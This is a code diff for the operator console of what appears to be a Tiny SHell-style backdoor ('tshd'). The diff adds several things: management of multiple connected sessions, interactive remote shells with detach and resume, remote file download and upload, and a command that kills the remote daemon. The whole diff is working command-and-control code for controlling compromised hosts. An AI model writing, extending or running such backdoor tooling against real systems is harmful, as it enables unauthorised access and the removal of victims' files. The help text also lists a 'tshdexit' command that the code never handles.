@@ -28,6 +28,10 @@ type Session struct {
 	User       string
 	Hostname   string
 	OS         string
+
+	ShellStarted bool
+	OutputChan   chan []byte
+	CloseChan    chan struct{}
 }
 
 var (
@@ -146,11 +150,27 @@ func Run() {
 					User:       userStr,
 					Hostname:   hostStr,
 					OS:         osStr,
+					OutputChan: make(chan []byte, 100),
 				}
 				// PktEncLayer doesn't expose RemoteAddr directly in the struct but we can try to get it if we exposed it.
 				// For now, just store it.
 				sessions[id] = session
 				sessionMux.Unlock()
+
+				// Start persistent reader loop
+				go func(s *Session) {
+					defer close(s.OutputChan)
+					buf := make([]byte, constants.Bufsize)
+					for {
+						n, err := s.Conn.Read(buf)
+						if err != nil {
+							return
+						}
+						data := make([]byte, n)
+						copy(data, buf[:n])
+						s.OutputChan <- data
+					}
+				}(session)
 
 				// Print to stdout directly? But we are in a terminal prompt.
 				// If we are using NewTerminal, writing to stdout might mess up the prompt line.
@@ -195,8 +215,14 @@ func Run() {
 				term.Write([]byte("Commands:\r\n"))
 				term.Write([]byte("  list, sessions    List active sessions\r\n"))
 				term.Write([]byte("  interact <id>     Interact with a session\r\n"))
+				term.Write([]byte("  kill <id>         Terminate remote daemon\r\n"))
+				term.Write([]byte("  download <id> ... Download file (usage: download <id> <remote_file> <local_dir>)\r\n"))
+				term.Write([]byte("  upload <id> ...   Upload file (usage: upload <id> <local_file> <remote_dir>)\r\n"))
 				term.Write([]byte("  use <id>          Alias for interact\r\n"))
 				term.Write([]byte("  exit, quit        Exit server\r\n"))
+				term.Write([]byte("\r\nInteractive commands:\r\n"))
+				term.Write([]byte("  tshdbg<Enter>     Detach from session (background)\r\n"))
+				term.Write([]byte("  tshdexit<Enter>   Terminate remote daemon\r\n"))
 			case "list", "sessions":
 				printSessionsToTerm(term)
 			case "interact", "use":
@@ -215,6 +241,44 @@ func Run() {
 				handleSessionInteraction(id, mode, command, srcfile, dstdir)
 				// Re-enable raw mode
 				terminal.MakeRaw(int(os.Stdin.Fd()))
+
+			case "download", "get":
+				if len(parts) < 4 {
+					term.Write([]byte("Usage: download <id> <remote_file> <local_dir>\r\n"))
+					break
+				}
+				id, err := strconv.Atoi(parts[1])
+				if err != nil {
+					term.Write([]byte("Invalid ID\r\n"))
+					break
+				}
+				handleSessionInteraction(id, constants.GetFile, "", parts[2], parts[3])
+
+			case "upload", "put":
+				if len(parts) < 4 {
+					term.Write([]byte("Usage: upload <id> <local_file> <remote_dir>\r\n"))
+					break
+				}
+				id, err := strconv.Atoi(parts[1])
+				if err != nil {
+					term.Write([]byte("Invalid ID\r\n"))
+					break
+				}
+				handleSessionInteraction(id, constants.PutFile, "", parts[2], parts[3])
+
+			case "kill":
+				if len(parts) < 2 {
+					term.Write([]byte("Usage: kill <id>\r\n"))
+					break
+				}
+				id, err := strconv.Atoi(parts[1])
+				if err != nil {
+					term.Write([]byte("Invalid ID\r\n"))
+					break
+				}
+				// Send Terminate command
+				handleSessionInteraction(id, constants.Terminate, "", "", "")
+				term.Write([]byte("Sent terminate signal.\r\n"))
 
 			case "exit", "quit":
 				terminal.Restore(int(os.Stdin.Fd()), oldState)
@@ -237,8 +301,29 @@ func Run() {
 		}
 		defer layer.Close()
 
+		// Create a temporary session wrapper for single-mode interaction
+		session := &Session{
+			Conn:       layer,
+			OutputChan: make(chan []byte, 100),
+		}
+
+		// Start reader loop for this session
+		go func(s *Session) {
+			defer close(s.OutputChan)
+			buf := make([]byte, constants.Bufsize)
+			for {
+				n, err := s.Conn.Read(buf)
+				if err != nil {
+					return
+				}
+				data := make([]byte, n)
+				copy(data, buf[:n])
+				s.OutputChan <- data
+			}
+		}(session)
+
 		// Execute single command/action
-		executeAction(layer, mode, command, srcfile, dstdir)
+		executeAction(session, mode, command, srcfile, dstdir)
 	}
 }
 
@@ -274,58 +359,32 @@ func handleSessionInteraction(id int, mode uint8, command, srcfile, dstdir strin
 
 	fmt.Printf("[*] Interacting with session %d...\n", id)
 
-	// Send the mode byte
-	// Note: In original code, mode was sent immediately after connect.
-	// Here we send it when we interact?
-	// Wait, the protocol expects the mode byte immediately after handshake.
-	// If we accepted the connection and waited, the client (tshd) is blocked on `Read()` waiting for the command byte?
-	// tshd.go: HandleGeneric calls layer.Read(buf, 0, 1). So yes, it waits.
-
-	// Check if we already initiated this session?
-	// If we want to re-use sessions, we can't just send "mode" again if the previous command finished.
-	// The current tshd implementation handles ONE command per connection loop in HandleClient -> HandleGeneric.
-	// HandleGeneric reads 1 byte.
-	// After HandleRunShell/GetFile/PutFile returns, HandleClient loop?
-	// Let's check cmd/tshd.cs and cmd/tshd.go.
-
-	// In tshd.go:
-	// func HandleClient(conn net.Conn) { ... HandleGeneric(layer) ... }
-	// func HandleGeneric(...) { ... switch buf[0] ... }
-
-	// It does NOT loop HandleGeneric. It calls it ONCE.
-	// So one connection = one command.
-	// If we want "Multiple Sessions", we are really just holding the connection open until we decide what to do with it.
-	// Once we do "interact", we send the mode, run the shell, and when shell exits, the connection closes.
-	// So the session is "consumed".
-
-	// So, we should remove it from the map after interaction.
-
-	// But wait, can we send multiple commands?
-	// HandleRunShell in tshd starts a process and pipes IO. When process exits, it returns.
-	// But HandleGeneric returns to HandleClient? No.
-	// In tshd.go:
-	// if layer.Handshake(...) { HandleGeneric(layer) }
-	// HandleGeneric reads 1 byte, calls sub-handler.
-	// Sub-handler returns.
-	// HandleClient finishes -> defers layer.Close().
-
-	// So yes, currently 1 Connection = 1 Command session.
-	// So "Multi Session Management" here means "Queueing incoming connections and picking which one to activate".
-	// Once activated, it runs and dies.
-
-	// Send mode
-	_, err := session.Conn.Write([]byte{mode})
-	if err != nil {
-		fmt.Println("Error writing to session:", err)
-		removeSession(id)
-		return
+	// Check if session is already running a shell
+	if session.ShellStarted {
+		if mode != constants.RunShell {
+			fmt.Println("Session is busy running a shell. You cannot perform other actions.")
+			return
+		}
+		// Resume shell
+	} else {
+		// Send mode
+		_, err := session.Conn.Write([]byte{mode})
+		if err != nil {
+			fmt.Println("Error writing to session:", err)
+			removeSession(id)
+			return
+		}
+		// Do not set ShellStarted here, let handleRunShell do it after handshake
 	}
 
-	executeAction(session.Conn, mode, command, srcfile, dstdir)
+	keepSession := executeAction(session, mode, command, srcfile, dstdir)
 
-	// Remove session as it's likely closed or finished
-	removeSession(id)
-	fmt.Println("\n[*] Session finished.")
+	if !keepSession {
+		removeSession(id)
+		fmt.Println("\n[*] Session finished.")
+	} else {
+		fmt.Println("\n[*] Detached from session.")
+	}
 }
 
 func removeSession(id int) {
@@ -337,26 +396,40 @@ func removeSession(id int) {
 	}
 }
 
-func executeAction(layer *pel.PktEncLayer, mode uint8, command, srcfile, dstdir string) {
+func executeAction(session *Session, mode uint8, command, srcfile, dstdir string) bool {
 	switch mode {
 	case constants.RunShell:
-		handleRunShell(layer, command)
+		return handleRunShell(session, command)
 	case constants.GetFile:
-		handleGetFile(layer, srcfile, dstdir)
+		handleGetFile(session.Conn, srcfile, dstdir)
+		return false
 	case constants.PutFile:
-		handlePutFile(layer, srcfile, dstdir)
+		handlePutFile(session.Conn, srcfile, dstdir)
+		return false
+	case constants.Terminate:
+		// Terminate command doesn't need payload, just mode byte was sent
+		return false
 	}
+	return false
 }
 
 // Existing handlers...
-func handleGetFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
+func handleGetFile(layer *pel.PktEncLayer, srcfile, dstPath string) {
 	buffer := make([]byte, constants.Bufsize)
 
-	basename := strings.ReplaceAll(srcfile, "\\", "/")
-	basename = filepath.Base(filepath.FromSlash(basename))
+	var finalPath string
+	info, err := os.Stat(dstPath)
+	if err == nil && info.IsDir() {
+		basename := strings.ReplaceAll(srcfile, "\\", "/")
+		basename = filepath.Base(filepath.FromSlash(basename))
+		finalPath = filepath.Join(dstPath, basename)
+	} else {
+		finalPath = dstPath
+	}
 
-	f, err := os.OpenFile(filepath.Join(dstdir, basename), os.O_CREATE|os.O_RDWR, 0644)
+	f, err := os.OpenFile(finalPath, os.O_CREATE|os.O_RDWR, 0644)
 	if err != nil {
+		fmt.Println("Local Error:", err)
 		return
 	}
 	defer f.Close()
@@ -364,6 +437,21 @@ func handleGetFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
 	if err != nil {
 		return
 	}
+
+	// Check Remote Status
+	status := make([]byte, 1)
+	_, err = layer.Read(status)
+	if err != nil {
+		fmt.Println("Network Error:", err)
+		return
+	}
+	if status[0] == 0 {
+		// Failure
+		n, _ := layer.Read(buffer)
+		fmt.Println("Remote Error:", string(buffer[:n]))
+		return
+	}
+
 	bar := progressbar.NewOptions(-1,
 		progressbar.OptionSetWidth(20),
 		progressbar.OptionEnableColorCodes(true),
@@ -376,10 +464,11 @@ func handleGetFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
 	fmt.Print("\nDone.\n")
 }
 
-func handlePutFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
+func handlePutFile(layer *pel.PktEncLayer, srcfile, dstPath string) {
 	buffer := make([]byte, constants.Bufsize)
 	f, err := os.Open(srcfile)
 	if err != nil {
+		fmt.Println("Local Error:", err)
 		return
 	}
 	defer f.Close()
@@ -389,13 +478,36 @@ func handlePutFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
 	}
 	fsize := fi.Size()
 
-	basename := filepath.Base(srcfile)
-	basename = strings.ReplaceAll(basename, "\\", "_")
-	_, err = layer.Write([]byte(dstdir + "/" + basename))
+	var remotePath string
+	// Check if dstPath looks like a directory (trailing slash)
+	if strings.HasSuffix(dstPath, "/") || strings.HasSuffix(dstPath, "\\") {
+		basename := filepath.Base(srcfile)
+		// Ensure separator
+		remotePath = dstPath + basename
+	} else {
+		remotePath = dstPath
+	}
+
+	_, err = layer.Write([]byte(remotePath))
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
+
+	// Check Remote Status
+	status := make([]byte, 1)
+	_, err = layer.Read(status)
+	if err != nil {
+		fmt.Println("Network Error:", err)
+		return
+	}
+	if status[0] == 0 {
+		// Failure
+		n, _ := layer.Read(buffer)
+		fmt.Println("Remote Error:", string(buffer[:n]))
+		return
+	}
+
 	bar := progressbar.NewOptions(int(fsize),
 		progressbar.OptionSetWidth(20),
 		progressbar.OptionEnableColorCodes(true),
@@ -407,95 +519,97 @@ func handlePutFile(layer *pel.PktEncLayer, srcfile, dstdir string) {
 	fmt.Print("\nDone.\n")
 }
 
-func handleRunShell(layer *pel.PktEncLayer, command string) {
+func handleRunShell(session *Session, command string) bool {
 	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
-		return
+		return false
 	}
 
 	defer func() {
 		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
-		_ = recover()
 	}()
 
-	term := os.Getenv("TERM")
-	if term == "" {
-		term = "vt100"
+	if !session.ShellStarted {
+		term := os.Getenv("TERM")
+		if term == "" {
+			term = "vt100"
+		}
+		_, err = session.Conn.Write([]byte(term))
+		if err != nil {
+			return false
+		}
+
+		ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
+		ws := make([]byte, 4)
+		ws[0] = byte((ws_row >> 8) & 0xFF)
+		ws[1] = byte((ws_row) & 0xFF)
+		ws[2] = byte((ws_col >> 8) & 0xFF)
+		ws[3] = byte((ws_col) & 0xFF)
+		_, err = session.Conn.Write(ws)
+		if err != nil {
+			return false
+		}
+
+		_, err = session.Conn.Write([]byte(command))
+		if err != nil {
+			return false
+		}
+		session.ShellStarted = true
 	}
-	_, err = layer.Write([]byte(term))
-	if err != nil {
-		return
-	}
 
-	ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
-	ws := make([]byte, 4)
-	ws[0] = byte((ws_row >> 8) & 0xFF)
-	ws[1] = byte((ws_row) & 0xFF)
-	ws[2] = byte((ws_col >> 8) & 0xFF)
-	ws[3] = byte((ws_col) & 0xFF)
-	_, err = layer.Write(ws)
-	if err != nil {
-		return
-	}
+	actionChan := make(chan int) // 0: remote closed, 1: detach, 2: terminate
 
-	_, err = layer.Write([]byte(command))
-	if err != nil {
-		return
-	}
-
-	buffer := make([]byte, constants.Bufsize)
-	buffer2 := make([]byte, constants.Bufsize)
-
-	// We need a way to know when the shell finishes to return to menu.
-	// utils.CopyBuffer blocks?
-	// The original code spawned a goroutine for Stdout->Layer, and ran Layer->Stdin in main thread?
-	// No:
-	// go func() { CopyBuffer(Stdout, layer) ... }()
-	// CopyBuffer(layer, Stdin)
-
-	// If remote shell closes, 'layer' read returns EOF.
-	// The goroutine copying Stdout (from layer) will finish.
-	// But the main thread copying Stdin (to layer) is reading from os.Stdin. It won't know layer closed unless Write fails.
-
-	// Wait, original code:
-	// go func() { ... CopyBuffer(os.Stdout, layer, buffer) ... }() // Reading from layer, writing to Stdout
-	// CopyBuffer(layer, os.Stdin, buffer2) // Reading from Stdin, writing to layer
-
-	// If server closes connection:
-	// layer.Read returns error/EOF. The goroutine finishes.
-	// What about the main thread? It is blocked on os.Stdin.Read().
-	// We need to interrupt os.Stdin.Read() or check for connection status.
-
-	// Since we are in "MakeRaw" mode, we can capture keys.
-	// But CopyBuffer just does io.Copy.
-
-	// We need a coordinated shutdown.
-	done := make(chan struct{})
-
+	// Output Loop
 	go func() {
-		utils.CopyBuffer(os.Stdout, layer, buffer) // Reads from layer
-		close(done)
+		for {
+			select {
+			case data, ok := <-session.OutputChan:
+				if !ok {
+					actionChan <- 0
+					return
+				}
+				os.Stdout.Write(data)
+			case <-actionChan:
+				// If action received from input loop (or self), stop
+				return
+			}
+		}
 	}()
 
-	// How to interrupt Stdin read?
-	// We can't easily interrupt a blocking Read on Stdin in Go without closing Stdin (which we don't want).
-	// But if the user types 'exit', the remote shell closes, layer closes, and the goroutine signals done.
-	// But we are still stuck in Stdin.Read.
+	// Input Loop
+	go func() {
+		buf := make([]byte, 128)
+		var lastBytes []byte
 
-	// However, the original code just returned.
-	// If 'layer' is closed, layer.Write will fail.
-	// So if we type something, it fails and returns.
-	// But we want it to return immediately if remote closes.
+		for {
+			n, err := os.Stdin.Read(buf)
+			if err != nil {
+				return
+			}
 
-	// This is a known issue in simple Go shells.
-	// For this specific task, I will keep the original behavior but wrap it to ensure we restore terminal properly.
+			_, err = session.Conn.Write(buf[:n])
+			if err != nil {
+				return
+			}
 
-	// Actually, the original code:
-	// go func() { ... layer.Close() }()
-	// CopyBuffer(layer, os.Stdin...)
+			for i := 0; i < n; i++ {
+				b := buf[i]
+				lastBytes = append(lastBytes, b)
+				if len(lastBytes) > 20 {
+					lastBytes = lastBytes[len(lastBytes)-20:]
+				}
 
-	// If layer closes, Write to layer fails. CopyBuffer returns. Correct.
-	// So if remote side closes, the next keypress will cause Write error and exit loop.
+				if len(lastBytes) >= 7 {
+					suffix := string(lastBytes[len(lastBytes)-7:])
+					if suffix == "tshdbg\r" || suffix == "tshdbg\n" {
+						actionChan <- 1
+						return
+					}
+				}
+			}
+		}
+	}()
 
-	utils.CopyBuffer(layer, os.Stdin, buffer2)
+	action := <-actionChan
+	return action == 1
 }
